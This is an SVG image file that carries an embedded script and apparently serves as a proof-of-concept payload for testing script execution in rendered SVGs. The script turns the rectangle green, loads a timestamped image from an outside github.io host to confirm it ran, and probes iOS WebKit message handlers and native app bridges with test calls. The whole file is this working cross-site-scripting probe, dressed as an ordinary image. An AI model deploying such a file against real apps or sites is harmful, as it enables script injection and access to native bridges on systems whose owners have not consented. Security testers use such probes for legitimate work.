<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(255,0,0);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      // Try to trigger a visible effect
      document.getElementsByTagName('rect')[0].style.fill = 'green';
      
      // Try to load an external resource to confirm execution
      var img = new Image();
      img.src = 'https://mtrf3.github.io/finding/confirm.png?' + new Date().getTime();
      
      // Try iOS-specific APIs
      try {
         window.webkit.messageHandlers.someHandler.postMessage("test");
      } catch(e) {}
      
      // Try to access native app bridge if available
      if(window.bridge) {
         window.bridge.call("test");
      }
   </script>
</svg>
